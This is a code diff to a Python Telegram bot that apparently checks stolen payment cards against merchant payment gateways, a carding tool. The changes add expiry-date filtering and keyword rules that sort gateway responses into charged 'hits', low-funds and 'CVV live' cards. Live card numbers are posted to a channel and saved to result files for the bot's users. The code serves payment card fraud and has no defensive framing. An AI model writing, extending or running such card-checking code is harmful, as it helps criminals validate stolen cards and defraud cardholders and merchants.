@@ -27,7 +27,7 @@ PREMIUM_EMOJI_IDS = {
     "⏸️": "6001440193058444284", "▶️": "6285315214673975495", "🛑": "5420323339723881652",
     "📊": "6032808241891644148", "📦": "6066395745139824604", "📋": "5974235702701853774",
     "🔄": "5971837723676249096", "⏳": "5971837723676249096", "🚀": "6235302918967269680",
-    "⚠️": "5420323339723881652", "💎": "4956739572114392015",
+    "⚠️": "5420323339723881652", "💎": "4956739572114392015", "📅": "6066395745139824604",
 }
 
 def get_emj(emoji_char):
@@ -78,6 +78,36 @@ for gate_file in glob.glob('gatet*.py'):
 
 bot = telebot.TeleBot(token, parse_mode="HTML")
 active_checks = {}
+
+def is_card_expired(cc):
+    """Check if card expiry date has passed"""
+    try:
+        parts = cc.split("|")
+        if len(parts) >= 3:
+            exp_month = parts[1].strip()
+            exp_year_raw = parts[2].strip()
+            
+            # Convert year (26 -> 2026)
+            if len(exp_year_raw) == 2:
+                exp_year = 2000 + int(exp_year_raw)
+            else:
+                exp_year = int(exp_year_raw)
+            
+            exp_month_int = int(exp_month)
+            
+            current_date = datetime.now()
+            current_year = current_date.year
+            current_month = current_date.month
+            
+            if exp_year < current_year:
+                return True, exp_month, exp_year_raw
+            elif exp_year == current_year and exp_month_int < current_month:
+                return True, exp_month, exp_year_raw
+            else:
+                return False, exp_month, exp_year_raw
+    except:
+        pass
+    return False, None, None
 
 @bot.message_handler(commands=["start"])
 def start(message):
@@ -207,13 +237,11 @@ def update_ui(message, stats):
     try: bot.edit_message_text(chat_id=message.chat.id, message_id=stats['msg_id'], text=text, reply_markup=markup)
     except: pass
 
-# --- NEW FUNCTION: Save results to files ---
 def save_result_to_file(cc, status_type, bank, country, gate_name):
     try:
         file_path_hit = os.path.join(RESULTS_DIR, "hit.txt")
         file_path_low = os.path.join(RESULTS_DIR, "low.txt")
         
-        # Format: CC|Bank|Country|Gate|Time
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         line = f"{cc}|{bank}|{country}|{gate_name}|{timestamp}\n"
         
@@ -227,25 +255,20 @@ def save_result_to_file(cc, status_type, bank, country, gate_name):
         print(f"File save error: {e}")
 
 def send_result_files(message, chat_id):
-    """Send hit.txt and low.txt to user if they exist and not empty"""
     hit_path = os.path.join(RESULTS_DIR, "hit.txt")
     low_path = os.path.join(RESULTS_DIR, "low.txt")
     
     try:
-        # Send HIT file
         if os.path.exists(hit_path) and os.path.getsize(hit_path) > 0:
             with open(hit_path, 'rb') as f:
                 bot.send_document(chat_id, f, caption=f"{get_emj('🔥')} <b>HIT RESULTS</b>")
-            # Clear file after sending
             open(hit_path, 'w').close()
         else:
             bot.send_message(chat_id, f"{get_emj('❌')} No HIT results found.")
         
-        # Send LOW file
         if os.path.exists(low_path) and os.path.getsize(low_path) > 0:
             with open(low_path, 'rb') as f:
                 bot.send_document(chat_id, f, caption=f"{get_emj('💰')} <b>LOW FUND RESULTS</b>")
-            # Clear file after sending
             open(low_path, 'w').close()
         else:
             bot.send_message(chat_id, f"{get_emj('❌')} No LOW FUND results found.")
@@ -257,35 +280,98 @@ def process_cc(cc, message, stats):
     cc = cc.strip()
     if not cc: return
     stats['last_cc'] = cc
-    try: data = requests.get('https://bins.antipublic.cc/bins/'+cc[:6], timeout=5).json()
-    except: data = {}
-    country = data.get('country_name', 'Unknown'); flag = data.get('country_flag', 'Unknown'); bank = data.get('bank', 'Unknown')
-    start_time = time.time(); gate_name = "N/A"; last = "Error"
+    
+    # ========== CHECK EXPIRY DATE FIRST ==========
+    is_expired, exp_month, exp_year = is_card_expired(cc)
+    
+    if is_expired:
+        stats['dd'] += 1
+        stats['checked'] += 1
+        stats['last_resp'] = f"📅 CARD EXPIRED ({exp_month}/{exp_year})"
+        stats['last_gate'] = "N/A"
+        
+        expired_msg = f"""
+{get_emj('📅')} <b>EXPIRED CARD!</b> {get_emj('❌')}
+<b>━━━━━━━━━━━━━━</b>
+{get_emj('💳')} <b>CARD:</b> <code>{cc}</code>
+{get_emj('📝')} <b>STATUS:</b> <code>Card Expired ({exp_month}/{exp_year})</code>
+<b>━━━━━━━━━━━━━━</b>
+<b>BY: @Mydev1</b>
+"""
+        bot.reply_to(message, expired_msg)
+        
+        if stats['checked'] % 5 == 0 or stats['checked'] == stats['total']:
+            update_ui(message, stats)
+        return
+    
+    # ========== CONTINUE WITH GATEWAY CHECK ==========
+    try: 
+        data = requests.get('https://bins.antipublic.cc/bins/'+cc[:6], timeout=5).json()
+    except: 
+        data = {}
+    country = data.get('country_name', 'Unknown')
+    flag = data.get('country_flag', 'Unknown')
+    bank = data.get('bank', 'Unknown')
+    
+    start_time = time.time()
+    gate_name = "N/A"
+    last = "Error"
+    
     if GATE_MODULES:
         random_gate = random.choice(GATE_MODULES)
         gate_name = random_gate.__name__
         stats['last_gate'] = gate_name
         try:
             last_raw = str(random_gate.Tele(cc))
+            
+            # Try to extract meaningful message
             if '"message":' in last_raw:
-                try: last = json.loads(last_raw)['error'].get('message', last_raw)
-                except: last = last_raw
-            else: last = last_raw if last_raw != "0" else "Site Rejected"
-        except: last = "Gateway Error"
+                try:
+                    response_json = json.loads(last_raw)
+                    if 'error' in response_json and 'message' in response_json['error']:
+                        last = response_json['error']['message']
+                    elif 'message' in response_json:
+                        last = response_json['message']
+                    else:
+                        last = last_raw
+                except:
+                    last = last_raw
+            else:
+                last = last_raw if last_raw != "0" else "Site Rejected"
+        except Exception as e:
+            last = f"Gateway Error: {str(e)[:50]}"
     
-    stats['last_resp'] = last; execution_time = time.time() - start_time; last_lower = last.lower()
-    is_hit = False; is_low = False; is_3ds = False
-    hit_k = ['thank', 'success":true', 'thank-you', 'successful', 'Successful!', 'confirmed', 'paid', 'transaction_id']
-    low_k = ['insufficient funds', 'low funds', 'money', 'balance']
-    three_k = ['additional action', 'authenticate', '3d_secure', 'verification required', 'challenge_required', 'initstripescamodal', 'client_secret', 'strong customer authentication']
+    stats['last_resp'] = last
+    execution_time = time.time() - start_time
+    last_lower = last.lower()
     
-    if any(k in last_lower for k in three_k): 
-        is_3ds = True; last = "3D Authentication Required"
-    elif any(k in last_lower for k in hit_k) and '"success":false' not in last_lower and 'error' not in last_lower: 
-        is_hit = True; last = "Transaction Successful" if "success" in last_lower else last
-    elif any(k in last_lower for k in low_k): 
-        is_low = True; last = "Insufficient Funds"
-
+    # ========== RESPONSE CLASSIFICATION ==========
+    is_hit = False
+    is_low = False
+    is_3ds = False
+    
+    # Keywords for different responses
+    hit_keywords = ['approved', 'thank', 'successful', 'confirmed', 'paid', 'charge', 'captured', 'success":true']
+    low_keywords = ['insufficient funds', 'low funds', 'balance', 'insufficient']
+    three_keywords = ['3d_secure', 'authenticate', 'verification required', 'challenge_required', 'action required', 'additional action']
+    expired_keywords = ['expired', 'expiry']
+    
+    # Check for expired from gateway response
+    if any(k in last_lower for k in expired_keywords):
+        last = f"📅 EXPIRED CARD"
+        stats['dd'] += 1
+    elif any(k in last_lower for k in three_keywords):
+        is_3ds = True
+        last = "3D Authentication Required"
+    elif any(k in last_lower for k in hit_keywords) and 'error' not in last_lower and '"success":false' not in last_lower:
+        is_hit = True
+        last = "Transaction Successful"
+    elif any(k in last_lower for k in low_keywords):
+        is_low = True
+        last = "Insufficient Funds"
+    else:
+        stats['dd'] += 1
+    
     user_fname = message.from_user.first_name
     user_uname = f"@{message.from_user.username}" if message.from_user.username else "No Username"
     user_display = f"{user_fname} ({user_uname})"
@@ -302,27 +388,29 @@ def process_cc(cc, message, stats):
 <b>━━━━━━━━━━━━━━</b>
 <b>BY: @Mydev1</b>
 """
-    if is_hit: 
+    
+    if is_hit:
         stats['ch'] += 1
         bot.reply_to(message, hit_msg)
         send_to_channel(cc, last, gate_name, user_display, "charged")
-        save_result_to_file(cc, "hit", bank, country, gate_name)  # <--- SAVE HIT
-    elif is_low: 
+        save_result_to_file(cc, "hit", bank, country, gate_name)
+    elif is_low:
         stats['low'] += 1
         bot.reply_to(message, hit_msg.replace("HIT FOUND", "LOW FUNDS").replace(get_emj('🔥'), get_emj('💰')))
         send_to_channel(cc, last, gate_name, user_display, "low")
-        save_result_to_file(cc, "low", bank, country, gate_name)  # <--- SAVE LOW
-    elif is_3ds: 
+        save_result_to_file(cc, "low", bank, country, gate_name)
+    elif is_3ds:
         stats['cvv'] += 1
         bot.reply_to(message, hit_msg.replace("HIT FOUND", "CVV LIVE").replace(get_emj('🔥'), get_emj('💎')))
         send_to_channel(cc, last, gate_name, user_display, "cvv")
-        # CVV Live results are not saved to separate file by your request, only HIT and LOW
-    elif 'security code is incorrect' in last_lower or 'cvc_check_failure' in last_lower: stats['ccn'] += 1
-    elif 'Your card does not support this type of purchase' in last_lower or 'transaction_not_allowed' in last_lower: stats['cvv'] += 1
-    else: stats['dd'] += 1
+    elif 'security code is incorrect' in last_lower or 'cvc_check_failure' in last_lower:
+        stats['ccn'] += 1
+    elif 'Your card does not support this type of purchase' in last_lower or 'transaction_not_allowed' in last_lower:
+        stats['cvv'] += 1
     
     stats['checked'] += 1
-    if stats['checked'] % 5 == 0 or stats['checked'] == stats['total']: update_ui(message, stats)
+    if stats['checked'] % 5 == 0 or stats['checked'] == stats['total']:
+        update_ui(message, stats)
 
 @bot.message_handler(content_types=["document"])
 def handle_docs(message):
@@ -349,7 +437,6 @@ def handle_docs(message):
     except: pass
     if os.path.exists(path): os.remove(path)
     
-    # --- SEND RESULT FILES AFTER CHECKING ---
     send_result_files(message, message.chat.id)
 
 @bot.callback_query_handler(func=lambda call: call.data == 'stop')
@@ -362,5 +449,5 @@ def stop_cb(call):
 
 if __name__ == "__main__":
     bot.delete_webhook()
-    print("Fast Bot is running with HIT/LOW File Export...")
+    print("Fast Bot is running with EXPIRY DETECTION & HIT/LOW File Export...")
     bot.infinity_polling()
